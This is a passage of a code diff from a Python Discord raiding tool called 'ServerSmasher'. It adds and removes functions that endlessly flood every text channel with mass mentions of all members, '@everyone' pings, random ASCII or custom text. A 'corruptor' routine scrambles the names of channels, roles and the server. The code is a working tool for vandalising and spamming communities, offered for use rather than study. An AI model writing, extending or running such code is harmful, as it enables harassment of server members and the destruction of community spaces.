+                    exec.submit(send_message, channel.id, "@everyone", use_tts)
+            time.sleep(5)
+
+def corruptor(server):
+    print("Corrupting...")
+    for channel in server.channels:
+        pool.add_task(corrupt_channel, channel.id, channel.name)
+    for role in server.roles:
+        pool.add_task(corrupt_role, server.id, role.id, role.name)
+    servername = ''
+    for x in server.name:
+        if random.randint(1,2) == 1:
+            servername += asciigen(1)
+        else:
+            servername += x
+    server.edit(name=servername)
+    pool.wait_completion()
+    print("Corrupted the server.")
+    loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
+    main(SERVER)
 
             # if toga.lower() == 's':
             #     presetname = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name Of Preset: ')
@@ -1630,77 +1820,6 @@ def scripted_smash(server_id):
     #             await main(SERVER)
     #
 
-async def mass_tag(SERVER,usetts):
-    await asyncio.sleep(5)
-    server = client.get_guild(int(SERVER))
-    msg = ''
-    for member in server.members:
-        msg += member.mention + ' '
-    while not client.is_closed():
-        for channel in server.text_channels:
-            myperms = channel.permissions_for(server.get_member(client.user.id))
-            if not myperms.send_messages:
-                continue
-            print('Mass Mentioning in: '+channel.name)
-            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
-                pool.add_task(send_message,str(channel.id),m,usetts)
-
-async def ascii_spam(SERVER,usetts): # "oh god you scrambled that server"
-    await asyncio.sleep(5)
-    server = client.get_guild(int(SERVER))
-    await client.wait_until_ready()
-    while not client.is_closed():
-        for channel in server.text_channels:
-            myperms = channel.permissions_for(server.get_member(client.user.id))
-            if not myperms.send_messages:
-                continue
-            print('Ascii Spamming in: '+channel.name)
-            pool.add_task(send_message,str(channel.id),asciigen(1999),usetts)
-
-async def text_spam(SERVER,customtxt,usetts):
-    await asyncio.sleep(5)
-    server = client.get_guild(int(SERVER))
-    await client.wait_until_ready()
-    while not client.is_closed():
-        for channel in server.text_channels:
-            myperms = channel.permissions_for(server.get_member(client.user.id))
-            if not myperms.send_messages:
-                continue
-            print('Text Spamming in: '+channel.name)
-            pool.add_task(send_message,str(channel.id),customtxt,usetts)
-
-async def everyonespam(SERVER,usetts):
-    await asyncio.sleep(5)
-    server = client.get_guild(int(SERVER))
-    await client.wait_until_ready()
-    while not client.is_closed():
-        for channel in server.text_channels:
-            myperms = channel.permissions_for(server.get_member(client.user.id))
-            if not myperms.send_messages:
-                continue
-            message = "@everyone"
-            print('@everyone Spamming in: '+channel.name)
-            pool.add_task(send_message,str(channel.id),message,usetts)
-
-async def corruptor(server):
-    SERVER = server.id
-    print("Corrupting...")
-    for channel in server.channels:
-        pool.add_task(corrupt_channel,channel.id,channel.name)
-    for role in server.roles:
-        pool.add_task(corrupt_role,server.id,role.id,role.name)
-    servername = ''
-    for x in server.name:
-        if random.randint(1,2) == 1:
-            servername += asciigen(1)
-        else:
-            servername += x
-    await server.edit(name=servername)
-    pool.wait_completion()
-    print("Corrupted the server.")
-    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
-    await main(SERVER)
-
 def start_client():
     global client_type
     global token
@@ -1792,6 +1911,10 @@ while __name__ == "__main__":
         trace = traceback.format_exception(exc_type, exc_value, exc_traceback)
         for line in trace:
             exception += line
+        try:
+            ws.close()
+        except:
+            pass
         yesno = sg.PopupYesNo(f"ServerSmasher Crashed: {repr(e)}\nDetails:\n{exception}\n\nReport to DeadBread? (No revealing data is sent.)", title="ServerSmasher Crashed >:(")
         if yesno == "Yes":
             payload = {"content": f"```{exception}```"}
